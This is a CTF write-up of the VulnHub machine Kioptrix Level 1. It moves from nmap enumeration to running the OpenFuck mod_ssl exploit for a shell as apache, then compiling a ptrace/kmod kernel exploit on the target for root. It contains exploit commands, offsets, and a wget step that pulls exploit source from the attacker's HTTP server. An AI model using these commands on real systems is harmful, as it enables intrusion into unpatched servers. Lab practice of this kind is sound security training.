# Kioptrix Level 1 — CTF Writeup

**Author:** m-j-z  
**Date:** May 30, 2025  
**Platform:** VulnHub  
**Difficulty:** Beginner  
**Goal:** Gain root access  

---

## Table of Contents

1. [Overview](#overview)
2. [Enumeration](#enumeration)
3. [Vulnerability Analysis](#vulnerability-analysis)
4. [Exploitation — Initial Access](#exploitation--initial-access)
5. [Privilege Escalation](#privilege-escalation)
6. [Proof](#proof)
7. [Key Takeaways](#key-takeaways)

---

## Overview

Kioptrix Level 1 is a beginner-friendly boot-to-root machine available on VulnHub. The attack chain involves exploiting an outdated Apache web server with a vulnerable mod_ssl version to gain an initial foothold, followed by a kernel-level privilege escalation to achieve root.

**Attack Summary:**

| Stage | Method | Result |
|---|---|---|
| Initial Access | OpenFuck (CVE-2002-0082) — mod_ssl buffer overflow | Shell as `apache` |
| Privilege Escalation | ptrace/kmod kernel exploit (CVE-2003-0127) | Shell as `root` |

---

## Enumeration

### Nmap Scan

```
nmap -sV -sC -p- <target-ip>
```

**Key findings:**

```
80/tcp    open  http     Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
443/tcp   open  https    Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
22/tcp    open  ssh      OpenSSH 2.9p2
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
```

**Notable HTTP methods detected:**

```
Supported Methods: GET HEAD OPTIONS TRACE
Potentially risky methods: TRACE
```

### Banner Analysis

The nmap banner immediately revealed a very old and vulnerable stack:

- **Apache 1.3.20** — ancient version with known RCE vulnerabilities
- **mod_ssl/2.8.4** — vulnerable to the OpenFuck buffer overflow (CVE-2002-0082)
- **OpenSSL/0.9.6b** — outdated, part of the vulnerable chain
- **Red Hat Linux** — helps narrow down the correct exploit offset

---

## Vulnerability Analysis

### Searchsploit — Finding the Right Exploit

```bash
searchsploit apache 1.3.20
searchsploit mod_ssl 2.8
```

**Relevant results:**

```
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2) | unix/remote/47080.c
Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation | linux/local/3.c
```

### CVE-2002-0082 — OpenFuck (mod_ssl Buffer Overflow)

The target runs mod_ssl **2.8.4**, which is below the patched version 2.8.7. This vulnerability allows a remote attacker to execute arbitrary code as the Apache process via a malformed client key during SSLv2 negotiation.

### CVE-2003-0127 — ptrace/kmod Kernel Exploit

The kernel version `2.4.7-10` is vulnerable to a local privilege escalation via the ptrace system call and kmod module loader, allowing any local user to gain root.

---

## Exploitation — Initial Access

### Step 1: Copy and compile OpenFuck

```bash
searchsploit -m unix/remote/47080.c
gcc -o OpenFuck 47080.c -lcrypto
```

> Note: This version (47080.c) is the updated OpenFuckV2 and compiles on modern systems with OpenSSL 3.x with warnings but no errors.

### Step 2: Find the correct offset

```bash
./OpenFuck 2>&1 | grep -i "red hat"
```

The two relevant offsets for Red Hat + Apache 1.3.20 were:

```
0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
```

### Step 3: Run the exploit

```bash
./OpenFuck 0x6b <target-ip> 443 -c 40
```

**Result:** Shell spawned as `apache`.

```
bash: no job control in this shell
bash-2.05$ whoami
apache
```

> Note: The exploit internally tries to download `ptrace-kmod.c` from packetstormsecurity.net. Since the target has no internet access, this step must be done manually (see below).

---

## Privilege Escalation

### Step 1: Check kernel version

```bash
uname -a
```

```
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
```

Kernel **2.4.7** on Red Hat — directly vulnerable to CVE-2003-0127.

### Step 2: Download ptrace-kmod.c on attacker machine

Since the target has no internet access, the exploit source was downloaded on the attacker machine and served over HTTP:

```bash
# On attacker machine
wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
python3 -m http.server 8080
```

### Step 3: Transfer to target

```bash
# On target shell
cd /tmp
wget http://<attacker-ip>:8080/ptrace-kmod.c
```

### Step 4: Compile and execute on target

```bash
gcc -o exploit ptrace-kmod.c -B /usr/bin
./exploit
```

**Result:** Root shell obtained.

```bash
whoami
root
```

---

## Proof

```
bash-2.05# whoami
root
```

---

## Key Takeaways

- **Always read service banners carefully.** The nmap output immediately revealed the exact vulnerable versions of Apache, mod_ssl, and OpenSSL — enough to identify the exploit without any further enumeration.

- **Match the exploit to the OS.** OpenFuck has an offset table with over 130 entries. Choosing the wrong offset will cause the exploit to fail. The Red Hat + Apache 1.3.20 combination narrowed it down to two candidates (`0x6a` and `0x6b`).

- **Exploits that fetch remote files will fail on isolated targets.** The original 3.c exploit tried to download ptrace-kmod.c from the internet. On an isolated lab machine this silently fails. Always read the exploit source before running it and pre-stage any dependencies.

- **Compile on the target when possible.** Modern systems have dropped legacy headers and deprecated APIs that old C exploits rely on. Transferring the source and compiling directly on the target avoids compatibility issues.

- **SUID binaries are always worth enumerating.** Running `find / -perm -4000` revealed `/usr/bin/suidperl` and the compiled exploit binary in `/tmp`, providing alternative privesc paths.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning and service enumeration |
| searchsploit | Finding exploit candidates |
| gcc | Compiling C exploits |
| python3 http.server | Serving files to the target |
| wget | Transferring files to the target |

---

## References

- [CVE-2002-0082 — mod_ssl OpenFuck](https://www.exploit-db.com/exploits/47080)
- [CVE-2003-0127 — ptrace/kmod Local Privesc](https://www.exploit-db.com/exploits/3)
- [Kioptrix Level 1 on VulnHub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
